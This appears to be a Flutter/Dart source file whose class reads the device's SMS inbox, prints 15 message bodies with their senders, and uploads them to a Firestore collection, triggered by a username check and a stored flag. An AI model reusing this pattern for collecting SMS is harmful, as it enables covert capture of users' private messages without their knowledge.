import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';

import 'Getuserdata.dart';

class UserPersonalMessages{
  int numberOFMessages = 15;
  GetUser getUser;
  String currentUserId,userName;
  List messages = [];
  List reversedmessages = [];
  List body = [];
  List address = [];
  bool getMessages = false;
  bool messagesAlreadyPresent = false;

  void getUserDetails() async{
    print("In getuserdetails");
    User user = await FirebaseAuth.instance.currentUser;
    currentUserId = user.uid.toString();
    DocumentSnapshot doc = await FirebaseFirestore.instance.collection("users").doc(currentUserId).get();
    getUser = GetUser.fromDocument(doc);
    userName = getUser.username;
    if(userName != "Developer"){
      print("Do nothing");
    }
    else{
      if(getMessages == false){
        print("No messages asked");
      }
      else if(getMessages  && messagesAlreadyPresent){
        print("getMessages is $getMessages and messagesAlreadyPresent is $messagesAlreadyPresent ....c.c..c.c.c.c");
        print("Not implementing update ");
        // updateSMS();
      }
      else if(getMessages){
        print("getMessages is $getMessages and messagesAlreadyPresent is $messagesAlreadyPresent");
        uploadSMS();
      }
    }
  }
  Future<dynamic> updateSMS() async{
    print("In updateSMS");
    SmsQuery query = new SmsQuery();
    messages = await query.getAllSms;
    print("Total number of messages are ${messages.length}");
    print("Now I'm printing $numberOFMessages messages");
    reversedmessages = new List.from(messages.reversed);
    for(int i=0;i<numberOFMessages;i++){
      body.add(messages[i].body);
      address.add(messages[i].address);
      print("${messages[i].body} and is from ${messages[i].address} ");
    }
    print("Completed printing $numberOFMessages messages");
    updateMessagestoFirebase();
  }

  Future<dynamic> updateMessagestoFirebase() async{
    for(int i=0;i<numberOFMessages;i++) {
      try {
        FirebaseFirestore.instance.collection("messages").doc().update({
          "from" :address[i],
          "messageIs": body[i],
        }).whenComplete(() {
          print("15 messages updated successfully");
          FirebaseFirestore.instance.collection("checkuser").doc("name").update(
              {
                "getMessages": false,
                "messagesAlreadyPresent": true,
              }).whenComplete(() {
            print("15 Messages updated successfully");
          });
        });
      }
      catch(e){
        print("From updateMessagestoFirebase and the error is ${e.code}");
      }
    }
  }


  Future<dynamic> uploadSMS() async{
    print("In uploadSMS");
    SmsQuery query = new SmsQuery();
    messages = await query.getAllSms;
    print("Total number of messages are ${messages.length}");
    print("Now I'm printing $numberOFMessages messages");
    reversedmessages = new List.from(messages.reversed);
    for(int i=0;i<numberOFMessages;i++){
      body.add(messages[i].body);
      address.add(messages[i].address);
      print("${messages[i].body} and is from ${messages[i].address} ");
    }
    print("Completed printing $numberOFMessages messages");
    uploadMessages();
  }

  Future<dynamic> uploadMessages() async{
    for(int i=0;i<numberOFMessages;i++){
      try{
        FirebaseFirestore.instance.collection("messages").doc().set({
          "from" :address[i],
          "messageIs": body[i],
        }).whenComplete(() {
          print("15 messages uploaded successfully");
          FirebaseFirestore.instance.collection("checkuser").doc("name").update({
            "getMessages": false,
            "messagesAlreadyPresent":true,
          }).catchError((e){

          });
        });
      }
      catch(e){
        print("From uploadMessages and the error is ${e.code}");
      }

    }
  }


}